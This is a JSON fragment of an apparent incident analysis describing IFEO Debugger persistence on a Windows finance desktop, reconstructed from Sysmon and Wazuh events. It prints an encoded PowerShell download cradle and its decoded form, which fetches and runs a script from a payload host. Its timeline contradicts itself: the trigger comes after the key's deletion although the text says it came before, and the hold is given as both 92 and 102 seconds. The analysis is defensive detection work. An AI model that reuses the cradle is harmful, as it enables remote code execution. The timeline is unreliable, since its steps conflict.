  "attack_progression": [
    {"step": 1, "tactic": "Persistence / Event Triggered Execution", "technique": "T1546.012", "what_happened": "At 2027-07-14 09:21:07 CEST, Sysmon Event ID 13 (RegistryValueSet) fired on WIN-FIN-DESK-07 (10.108.57.42). A Debugger value was written under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe. The Debugger value content was 'powershell.exe -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAA4AC4ANQA3AC4AMQA4ADQALwBwAC4AcABzADEAJwApAA==' — a Base64-encoded PowerShell download cradle. IFEO Debugger redirection means: whenever notepad.exe is launched, Windows runs the Debugger command INSTEAD of notepad. This is the exact 'IFEO Injection' artefact described in the Event Triggered Execution playbook (artefact A).", "chain_reason": "Sysmon EID 13 RegistrySetValue with data.win.eventdata.targetObject containing 'Image File Execution Options\\notepad.exe\\Debugger' and data.win.eventdata.details containing 'powershell.exe -w hidden -enc'. Wazuh rule fired on registry persistence under the IFEO key path.", "first_seen": "2027-07-14T09:21:07+0200"},
    {"step": 2, "tactic": "Persistence / Defense Evasion", "technique": "T1546.012", "what_happened": "The IFEO Debugger registry value remained in place for ~92 seconds (09:21:17 → 09:22:49) before being removed — long enough for Wazuh File Integrity Monitoring (FIM) to capture the registry change in a syscheck scan. The encoded blob decodes to: IEX(New-Object Net.WebClient).DownloadString('http://10.108.57.184/p.ps1') — a classic in-memory PowerShell download-and-execute cradle pointing at payload host 10.108.57.184. The deliberate hold-then-cleanup pattern (write key, hold, trigger, delete key) is operator tradecraft to minimise the persistence artefact's on-disk lifetime while still achieving the trigger.", "chain_reason": "Wazuh FIM (syscheck) registry-monitoring event on syscheck.path matching the IFEO notepad.exe key, syscheck.event=modified, observed ~92s before a syscheck.event=deleted event on the same path. The IEX/DownloadString cradle is the canonical T1546.012 payload-delivery pattern.", "first_seen": "2027-07-14T09:21:17+0200"},
    {"step": 3, "tactic": "Execution / Event Triggered Execution", "technique": "T1546.012 + T1059.001", "what_happened": "At 09:23:05 CEST, the attacker launched notepad.exe on WIN-FIN-DESK-07 to FIRE the IFEO trigger. Sysmon Event ID 1 (ProcessCreate) recorded that instead of (or alongside) notepad, powershell.exe spawned with commandLine 'powershell.exe -w hidden -enc SQBFAFgA...' and parentImage pointing at the IFEO redirect chain. The redirect worked: a predictable user action (opening Notepad) silently executed an encoded PowerShell download cradle. This is conditional, low-noise, event-triggered code execution — the attacker objective for T1546.012.", "chain_reason": "Sysmon EID 1 ProcessCreate with data.win.eventdata.image ending in powershell.exe, data.win.eventdata.commandLine containing '-w hidden -enc', correlated to the notepad.exe launch trigger. Wazuh rule mapped this to T1546.012 / T1059.001.", "first_seen": "2027-07-14T09:23:05+0200"},
    {"step": 4, "tactic": "Persistence / Defense Evasion — Cleanup", "technique": "T1546.012 + T1070.009", "what_happened": "At 09:22:49 CEST the attacker removed the IFEO Debugger registry key (Sysmon Event ID 12 RegistryObjectDeleted / RegistryKeyDelete on the notepad.exe IFEO key), restoring notepad.exe to normal behaviour. The persistence mechanism was deliberately short-lived: write → hold for FIM window → trigger → delete. This indicator-removal step is designed to leave minimal forensic residue — by the time a defender inspects the registry, the key is already gone and only the Sysmon/FIM event history proves it ever existed.", "chain_reason": "Sysmon EID 12 RegistryObjectDeleted with data.win.eventdata.targetObject matching the IFEO notepad.exe key path, ~102s after the EID 13 set event. Wazuh correlated the set→delete pair on the same registry object as an indicator-removal persistence cleanup.", "first_seen": "2027-07-14T09:22:49+0200"}
  ],
